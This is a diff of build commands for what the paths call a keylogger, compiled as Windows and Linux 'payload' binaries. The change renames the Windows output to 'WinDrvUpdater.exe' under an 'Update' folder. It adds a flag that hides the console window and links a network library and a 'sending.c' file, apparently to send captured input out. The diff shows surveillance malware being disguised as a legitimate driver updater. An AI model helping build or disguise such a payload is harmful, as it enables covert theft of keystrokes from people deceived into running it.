@@ -1,3 +1,3 @@
-x86_64-w64-mingw32-gcc -o /workspaces/keys/keylogger/src/assets/payload_win.exe win_main.c -lws2_32 -lgdi32 -lole32 -luuid -lgdi32 -lwindowscodecs
+x86_64-w64-mingw32-gcc win_main.c sending.c -o /workspaces/keys/Update/src/assets/WinDrvUpdater.exe -lws2_32 -lgdi32 -lole32 -luuid -lgdi32 -lwindowscodecs -mwindows -lwinhttp           
 cargo build --target x86_64-pc-windows-gnu --release
-gcc -o /workspaces/keys/keylogger/src/assets/payload_linux linux_main.c -lX11
+gcc -o /workspaces/keys/Update/src/assets/payload_linux linux_main.c -lX11
